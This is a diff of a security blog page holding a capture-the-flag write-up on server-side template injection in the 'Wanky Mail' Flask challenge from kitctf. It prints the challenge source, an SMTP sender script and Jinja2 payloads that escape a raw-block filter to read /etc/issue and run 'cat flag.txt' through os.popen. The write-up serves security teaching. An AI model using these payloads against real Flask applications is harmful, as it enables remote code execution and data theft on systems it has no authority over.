@@ -1,288 +1,180 @@
-<!DOCTYPE html>
-<html lang="en-us">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Template Injection Kitctf | incogbyte</title>
-  <meta name="description" content="Offensive Security">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="/css/style.css">
-</head>
-<body>
-  <canvas id="matrix-bg"></canvas>
-  <div class="scanline"></div>
-
-  <header class="site-header">
-  <nav class="navbar">
-    <a href="/" class="logo">
-      <span class="logo-bracket">[</span>
-      <span class="logo-text">incogbyte</span>
-      <span class="logo-bracket">]</span>
-      <span class="cursor">_</span>
-    </a>
-    <button class="menu-toggle" aria-label="Toggle menu">
-      <span></span>
-      <span></span>
-      <span></span>
-    </button>
-    <ul class="nav-links">
-      
-      <li><a href="/" class="nav-link">Home</a></li>
-      
-      <li><a href="/posts/" class="nav-link">Posts</a></li>
-      
-      <li><a href="/cve/" class="nav-link">CVEs</a></li>
-      
-      <li><a href="/about/" class="nav-link">About</a></li>
-      
-    </ul>
-  </nav>
-</header>
-
-
-  <main class="container">
-    
-<article class="post-single">
-  <header class="post-header fade-in">
-    <h1 class="post-single-title">Template Injection Kitctf</h1>
-    
-    <div class="post-single-meta">
-      <time>June 19, 2023</time>
-      <span class="reading-time">4 min read</span>
-    </div>
-    
-    
-    <div class="post-tags">
-      
-      <span class="tag">writeup</span>
-      
-    </div>
-    
-  </header>
-
-  <div class="post-content fade-in">
-    <p>In this blog post, we will explore a specific template injection vulnerability discovered in a CTF (Capture The Flag) challenge from kitctf. We will delve into the details of the vulnerability. Let’s dive in!</p>
-<blockquote>
-<p>If you don’t know what is template injection, strong recoment that you visit the Burp labs <a href="https://portswigger.net/web-security/server-side-template-injection">https://portswigger.net/web-security/server-side-template-injection</a>.</p>
-</blockquote>
-<p>Brief introduction what is template injection. Template injection occurs when an application allows user-controlled input to be directly included in a template without proper sanitization or validation. This can lead to the execution of arbitrary code within the template context, potentially leading to remote code execution (RCE) or other critical security breaches.</p>
-<h3 id="the-challeger-chall">The challeger (Chall)</h3>
-<p>The chall was called “Wanky Mail”. Wanky Mail is a temporary mail server, which you could send and receive messages. The cool thing about kitctf is that they provide a Dockerfile for you to “build” the challenge on your machine, and also the source code!. Below is the code of the mail server:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> flask <span style="color:#ff79c6">import</span> Flask, render_template_string, request, redirect, abort
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> aiosmtpd.controller <span style="color:#ff79c6">import</span> Controller
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> datetime <span style="color:#ff79c6">import</span> datetime
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> base58 <span style="color:#ff79c6">import</span> b58decode, b58encode
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> random 
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> string
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> os
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> datetime <span style="color:#ff79c6">import</span> datetime
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> queue
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>mails <span style="color:#ff79c6">=</span> {}
-</span></span><span style="display:flex;"><span>active_addr <span style="color:#ff79c6">=</span> queue<span style="color:#ff79c6">.</span>Queue(<span style="color:#bd93f9">1000</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">format_email</span>(sender, rcpt, body, timestamp, subject):
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> {<span style="color:#f1fa8c">&#34;sender&#34;</span>: sender, <span style="color:#f1fa8c">&#34;rcpt&#34;</span>: rcpt, <span style="color:#f1fa8c">&#39;body&#39;</span>: body, <span style="color:#f1fa8c">&#39;subject&#39;</span>: subject, <span style="color:#f1fa8c">&#34;timestamp&#34;</span>: timestamp}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">render_emails</span>(address):
-</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">id</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
-</span></span><span style="display:flex;"><span>    render <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">    &lt;table&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        &lt;tr&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            &lt;th id=&#34;th-left&#34;&gt;From&lt;/th&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            &lt;th&gt;Subject&lt;/th&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            &lt;th id=&#34;th-right&#34;&gt;Date&lt;/th&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        &lt;/tr&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">    &#34;&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>    overlays <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>    m <span style="color:#ff79c6">=</span> mails[address]<span style="color:#ff79c6">.</span>copy()
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> email <span style="color:#ff79c6">in</span> m:
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        render <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        &lt;tr id=&#34;</span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">id</span><span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            &lt;td&gt;</span><span style="color:#f1fa8c">{</span>email[<span style="color:#f1fa8c">&#39;sender&#39;</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&lt;/td&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            &lt;td&gt;</span><span style="color:#f1fa8c">{</span>email[<span style="color:#f1fa8c">&#39;subject&#39;</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&lt;/td&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            &lt;td&gt;</span><span style="color:#f1fa8c">{</span>email[<span style="color:#f1fa8c">&#39;timestamp&#39;</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&lt;/td&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        &lt;/tr&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        &#34;&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>        overlays <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        &lt;div id=&#34;overlay-</span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">id</span><span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34; class=&#34;overlay&#34;&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            &lt;div class=&#34;email-details&#34;&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">                &lt;h1&gt;</span><span style="color:#f1fa8c">{</span>email[<span style="color:#f1fa8c">&#39;subject&#39;</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c"> - from: </span><span style="color:#f1fa8c">{</span>email[<span style="color:#f1fa8c">&#39;sender&#39;</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c"> to </span><span style="color:#f1fa8c">{</span>email[<span style="color:#f1fa8c">&#39;rcpt&#39;</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&lt;/h1&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">                &lt;p&gt;</span><span style="color:#f1fa8c">{</span>email[<span style="color:#f1fa8c">&#39;body&#39;</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&lt;/p&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">            &lt;/div&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        &lt;/div&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        &#34;&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">id</span> <span style="color:#ff79c6">+=</span><span style="color:#bd93f9">1</span>
-</span></span><span style="display:flex;"><span>    render <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;&lt;/table&gt;&#34;</span>
-</span></span><span style="display:flex;"><span>    render <span style="color:#ff79c6">+=</span> overlays
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> render
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">get_emails</span>(<span style="color:#8be9fd;font-style:italic">id</span>):
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#39;templates/index.html&#39;</span>) <span style="color:#ff79c6">as</span> f:
-</span></span><span style="display:flex;"><span>        page <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">.</span>read()
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> page<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">&#39;{{$}}&#39;</span>, render_emails(<span style="color:#8be9fd;font-style:italic">id</span>))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">log_email</span>(session, envelope):
-</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">{</span>session<span style="color:#ff79c6">.</span>peer[<span style="color:#bd93f9">0</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c"> - - </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">repr</span>(envelope<span style="color:#ff79c6">.</span>mail_from)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">:</span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">repr</span>(envelope<span style="color:#ff79c6">.</span>rcpt_tos)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">:</span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">repr</span>(envelope<span style="color:#ff79c6">.</span>content)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#39;</span>, flush<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">esc</span>(s: <span style="color:#8be9fd;font-style:italic">str</span>):
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;{</span><span style="color:#f1fa8c">% r</span><span style="color:#f1fa8c">aw %}&#34;</span> <span style="color:#ff79c6">+</span> s <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;{</span><span style="color:#f1fa8c">% e</span><span style="color:#f1fa8c">ndraw %}&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">class</span> <span style="color:#50fa7b">Handler</span>:
-</span></span><span style="display:flex;"><span>     <span style="color:#ff79c6">async</span> <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">handle_RCPT</span>(self, server, session, envelope, address, rcpt_options):
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> address<span style="color:#ff79c6">.</span>endswith(os<span style="color:#ff79c6">.</span>environ<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#39;HOSTNAME&#39;</span>)):
-</span></span><span style="display:flex;"><span>             <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#39;550 not relaying to that domain&#39;</span>
-</span></span><span style="display:flex;"><span>        envelope<span style="color:#ff79c6">.</span>rcpt_tos<span style="color:#ff79c6">.</span>append(address)
-</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(address, flush<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#39;250 OK&#39;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>     <span style="color:#ff79c6">async</span> <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">handle_DATA</span>(self, server, session, envelope):
-</span></span><span style="display:flex;"><span>        m <span style="color:#ff79c6">=</span> format_email(esc(envelope<span style="color:#ff79c6">.</span>mail_from), envelope<span style="color:#ff79c6">.</span>rcpt_tos[<span style="color:#bd93f9">0</span>], esc(envelope<span style="color:#ff79c6">.</span>content<span style="color:#ff79c6">.</span>decode()), datetime<span style="color:#ff79c6">.</span>now()<span style="color:#ff79c6">.</span>strftime(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">%d</span><span style="color:#f1fa8c">-%m-%Y, %H:%M:%S&#34;</span>), <span style="color:#f1fa8c">&#34;PLACEHOLDER&#34;</span>)
-</span></span><span style="display:flex;"><span>        log_email(session, envelope)
-</span></span><span style="display:flex;"><span>        r <span style="color:#ff79c6">=</span> envelope<span style="color:#ff79c6">.</span>rcpt_tos[<span style="color:#bd93f9">0</span>]
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> mails<span style="color:#ff79c6">.</span>get(r):
-</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> active_addr<span style="color:#ff79c6">.</span>full():
-</span></span><span style="display:flex;"><span>                mails<span style="color:#ff79c6">.</span>pop(active_addr<span style="color:#ff79c6">.</span>get())
-</span></span><span style="display:flex;"><span>            mails[r] <span style="color:#ff79c6">=</span> []
-</span></span><span style="display:flex;"><span>            active_addr<span style="color:#ff79c6">.</span>put(r)
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">len</span>(mails[r]) <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">10</span>:
-</span></span><span style="display:flex;"><span>            mails[r]<span style="color:#ff79c6">.</span>pop(<span style="color:#bd93f9">0</span>)
-</span></span><span style="display:flex;"><span>        mails[r]<span style="color:#ff79c6">.</span>append(m)
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#39;250 OK&#39;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>c <span style="color:#ff79c6">=</span> Controller(Handler(), <span style="color:#f1fa8c">&#34;0.0.0.0&#34;</span>)
-</span></span><span style="display:flex;"><span>c<span style="color:#ff79c6">.</span>start()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>app <span style="color:#ff79c6">=</span> Flask(__name__)
-</span></span><span style="display:flex;"><span>@app.route(<span style="color:#f1fa8c">&#39;/&#39;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">index</span>():
-</span></span><span style="display:flex;"><span>    username <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">.</span>join(random<span style="color:#ff79c6">.</span>choice(string<span style="color:#ff79c6">.</span>ascii_lowercase) <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">12</span>))
-</span></span><span style="display:flex;"><span>    address <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{</span>username<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">@</span><span style="color:#f1fa8c">{</span>os<span style="color:#ff79c6">.</span>environ<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#39;HOSTNAME&#39;</span>, <span style="color:#f1fa8c">&#39;example.com&#39;</span>)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> address <span style="color:#ff79c6">in</span> mails<span style="color:#ff79c6">.</span>keys():
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> active_addr<span style="color:#ff79c6">.</span>full():
-</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">del</span> mails[active_addr<span style="color:#ff79c6">.</span>get()]
-</span></span><span style="display:flex;"><span>        mails[address] <span style="color:#ff79c6">=</span> []
-</span></span><span style="display:flex;"><span>        active_addr<span style="color:#ff79c6">.</span>put(address)
-</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">id</span> <span style="color:#ff79c6">=</span> b58encode(address)<span style="color:#ff79c6">.</span>decode()
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> redirect(<span style="color:#f1fa8c">&#34;/&#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">id</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>@app.route(<span style="color:#f1fa8c">&#39;/&lt;id&gt;&#39;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">mailbox</span>(<span style="color:#8be9fd;font-style:italic">id</span>):
-</span></span><span style="display:flex;"><span>    address <span style="color:#ff79c6">=</span> b58decode(<span style="color:#8be9fd;font-style:italic">id</span>)<span style="color:#ff79c6">.</span>decode()
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> address <span style="color:#ff79c6">in</span> mails<span style="color:#ff79c6">.</span>keys():
-</span></span><span style="display:flex;"><span>        abort(<span style="color:#bd93f9">404</span>)    
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> render_template_string(get_emails(address), address<span style="color:#ff79c6">=</span>address)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;__main__&#39;</span>:
-</span></span><span style="display:flex;"><span>    app<span style="color:#ff79c6">.</span>run()
-</span></span></code></pre></div><h3 id="analyzing-the-code">Analyzing the code</h3>
-<p>Analyzing the code we can identify that when sending an email to our temporary email, the code uses an escape function to render the email, as illustrated below:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">esc</span>(s: <span style="color:#8be9fd;font-style:italic">str</span>):
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;{</span><span style="color:#f1fa8c">% r</span><span style="color:#f1fa8c">aw %}&#34;</span> <span style="color:#ff79c6">+</span> s <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;{</span><span style="color:#f1fa8c">% e</span><span style="color:#f1fa8c">ndraw %}&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">class</span> <span style="color:#50fa7b">Handler</span>:
-</span></span><span style="display:flex;"><span>     <span style="color:#ff79c6">async</span> <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">handle_RCPT</span>(self, server, session, envelope, address, rcpt_options):
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> address<span style="color:#ff79c6">.</span>endswith(os<span style="color:#ff79c6">.</span>environ<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#39;HOSTNAME&#39;</span>)):
-</span></span><span style="display:flex;"><span>             <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#39;550 not relaying to that domain&#39;</span>
-</span></span><span style="display:flex;"><span>        envelope<span style="color:#ff79c6">.</span>rcpt_tos<span style="color:#ff79c6">.</span>append(address)
-</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(address, flush<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#39;250 OK&#39;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>     <span style="color:#ff79c6">async</span> <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">handle_DATA</span>(self, server, session, envelope):
-</span></span><span style="display:flex;"><span>        m <span style="color:#ff79c6">=</span> format_email(esc(envelope<span style="color:#ff79c6">.</span>mail_from), envelope<span style="color:#ff79c6">.</span>rcpt_tos[<span style="color:#bd93f9">0</span>], esc(envelope<span style="color:#ff79c6">.</span>content<span style="color:#ff79c6">.</span>decode()), datetime<span style="color:#ff79c6">.</span>now()<span style="color:#ff79c6">.</span>strftime(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">%d</span><span style="color:#f1fa8c">-%m-%Y, %H:%M:%S&#34;</span>), <span style="color:#f1fa8c">&#34;PLACEHOLDER&#34;</span>)
-</span></span><span style="display:flex;"><span>        log_email(session, envelope)
-</span></span><span style="display:flex;"><span>        r <span style="color:#ff79c6">=</span> envelope<span style="color:#ff79c6">.</span>rcpt_tos[<span style="color:#bd93f9">0</span>]
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> mails<span style="color:#ff79c6">.</span>get(r):
-</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> active_addr<span style="color:#ff79c6">.</span>full():
-</span></span><span style="display:flex;"><span>                mails<span style="color:#ff79c6">.</span>pop(active_addr<span style="color:#ff79c6">.</span>get())
-</span></span><span style="display:flex;"><span>            mails[r] <span style="color:#ff79c6">=</span> []
-</span></span><span style="display:flex;"><span>            active_addr<span style="color:#ff79c6">.</span>put(r)
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">len</span>(mails[r]) <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">10</span>:
-</span></span><span style="display:flex;"><span>            mails[r]<span style="color:#ff79c6">.</span>pop(<span style="color:#bd93f9">0</span>)
-</span></span><span style="display:flex;"><span>        mails[r]<span style="color:#ff79c6">.</span>append(m)
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#39;250 OK&#39;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>c <span style="color:#ff79c6">=</span> Controller(Handler(), <span style="color:#f1fa8c">&#34;0.0.0.0&#34;</span>)
-</span></span><span style="display:flex;"><span>c<span style="color:#ff79c6">.</span>start()
-</span></span></code></pre></div><p>So as you can see, in the code, every time someone sends an email, the “subject” and “content” fields execute the esc() function. To use the temporary email service, kitctf people provided some information to use the email server, to use the service, I made the following code in python to send emails using the smtplib library. As the following code demonstrates:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> smtplib
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> email.mime.text <span style="color:#ff79c6">import</span> MIMEText
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> email.mime.multipart <span style="color:#ff79c6">import</span> MIMEMultipart
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>sender_email <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;abx@kitctf.de&#39;</span>
-</span></span><span style="display:flex;"><span>receiver_email <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;abx@kitctf.de&#39;</span>
-</span></span><span style="display:flex;"><span>subject <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;pewpew&#39;</span>
-</span></span><span style="display:flex;"><span>message <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;pewpew&#39;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>msg <span style="color:#ff79c6">=</span> MIMEMultipart()
-</span></span><span style="display:flex;"><span>msg[<span style="color:#f1fa8c">&#39;From&#39;</span>] <span style="color:#ff79c6">=</span> sender_email
-</span></span><span style="display:flex;"><span>msg[<span style="color:#f1fa8c">&#39;To&#39;</span>] <span style="color:#ff79c6">=</span> receiver_email
-</span></span><span style="display:flex;"><span>msg[<span style="color:#f1fa8c">&#39;Subject&#39;</span>] <span style="color:#ff79c6">=</span> subject
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>msg<span style="color:#ff79c6">.</span>attach(MIMEText(message, <span style="color:#f1fa8c">&#39;plain&#39;</span>))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>smtp_server <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;mailserver-from-kitctf&#39;</span>
-</span></span><span style="display:flex;"><span>smtp_port <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">8025</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">with</span> smtplib<span style="color:#ff79c6">.</span>SMTP(smtp_server, smtp_port) <span style="color:#ff79c6">as</span> server:
-</span></span><span style="display:flex;"><span>    server<span style="color:#ff79c6">.</span>sendmail(sender_email, receiver_email, msg<span style="color:#ff79c6">.</span>as_string())
-</span></span></code></pre></div><p>The first step was to send a test code, in the subject field, with the objective of circumventing the esc() function, the payload {{7*7}} was used:</p>
-<p><img src="/images/kitctf-1.png" alt=""></p>
-<p><img src="/images/kitctf-2.png" alt=""></p>
-<p>The next step was to try to run commands using the command 'rodnt'.<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[92].<strong>subclasses</strong>()[0].<strong>subclasses</strong>()<a href="'/etc/issue'">0</a>.read():</p>
-<p><img src="/images/kitctf-3.png" alt=""></p>
-<p>The next step was to execute the payload to list the files contained in the machine, the following payload was used {{request.application.<strong>globals</strong>.<strong>builtins</strong>.<strong>import</strong>('os').popen('cat flag.txt').read()}}.</p>
-<p><img src="/images/kitctf-4.png" alt=""></p>
-<p><img src="/images/kitctf-5.png" alt=""></p>
-<blockquote>
-<p>All payloads had to be between {% endraw %} (% raw %}. Example: {% endraw %} {{ 7*7 }} {% raw %}, this was necessary to bypass the esc() function.</p>
-</blockquote>
-
-  </div>
-
-  <footer class="post-footer fade-in">
-    <div class="post-nav">
-      
-      <a href="https://incogbyte.github.io/posts/2022-01-20-cve-2022-23046-phpipam/" class="post-nav-link prev">
-        <span>← Previous</span>
-        <span class="post-nav-title">PHPIPAM CVE</span>
-      </a>
-      
-      
-      <a href="https://incogbyte.github.io/posts/decryptwhatsappmsgandroid/" class="post-nav-link next">
-        <span>Next →</span>
-        <span class="post-nav-title">Decrypt WhatsApp Msgs Android (Investigator)</span>
-      </a>
-      
-    </div>
-  </footer>
-</article>
-
-  </main>
-
-  <footer class="site-footer">
-  <div class="footer-content">
-    <div class="footer-links">
-      <a href="https://github.com/incogbyte" target="_blank" rel="noopener" aria-label="GitHub">GitHub</a>
-      <a href="https://x.com/incogbyte" target="_blank" rel="noopener" aria-label="X/Twitter">X</a>
-      <a href="https://linkedin.com/in/rodolfo-tavares-543863a7" target="_blank" rel="noopener" aria-label="LinkedIn">LinkedIn</a>
-      <a href="https://infosec.exchange/@incogbyte" target="_blank" rel="noopener" aria-label="Mastodon">Mastodon</a>
-    </div>
-    <p class="footer-copy">&copy; 2026 Rodolfo Tavares — Built with Hugo</p>
-  </div>
-</footer>
-
-
-  <script src="/js/matrix.js"></script>
-  <script src="/js/main.js"></script>
-</body>
-</html>
+<!doctype html><html lang=en-us><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Template Injection Kitctf | incogbyte</title>
